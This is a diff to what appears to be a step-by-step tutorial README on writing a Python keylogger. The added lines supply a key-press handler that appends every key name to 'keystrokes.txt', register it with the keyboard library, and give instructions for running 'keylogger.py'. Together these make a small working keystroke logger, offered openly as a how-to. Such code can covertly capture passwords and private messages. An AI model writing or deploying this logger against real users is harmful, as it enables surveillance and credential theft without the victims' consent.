@@ -31,17 +31,30 @@ log_file = 'keystrokes.txt'
 # Step 4
 Create the Key Press Event Function
 
-# Step
-Step 5: Register the Key Press Event
+def on_key_press(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.name))
+        
+# Step 5 
+Register the Key Press Event
 
-Finally, we want our program to wait until a key is pressed before it exits. Use the ‘keyboard.wait()’ function to accomplish this.
+Register the ‘on_key_press’ function to be called whenever a key is pressed. This will enable our code to capture the keystrokes. Add the following line:
 
-keyboard.wait()
+keyboard.on_press(on_key_press)
+# Step 6 
+Finally, we want our program to wait until a key is pressed before it exits. Use the 
+
+‘keyboard.wait()’
+
+function to accomplish this.
+
+# Step 7: 
+Run the Code
 
 ![Screenshot 2024-07-29 114950](https://github.com/user-attachments/assets/b4c6529f-d7b0-4ef3-b638-9813c1f0cb9b)
 
-Finally, we want our program to wait until a key is pressed before it exits. Use the ‘keyboard.wait()’ function to accomplish this.
+Save your Python script with a ‘.py’ extension (e.g., ‘keylogger.py’). Open your command prompt or terminal, navigate to the directory where the script is located, and execute the command:
 
-keyboard.wait()
+python3 keylogger.py
 
  
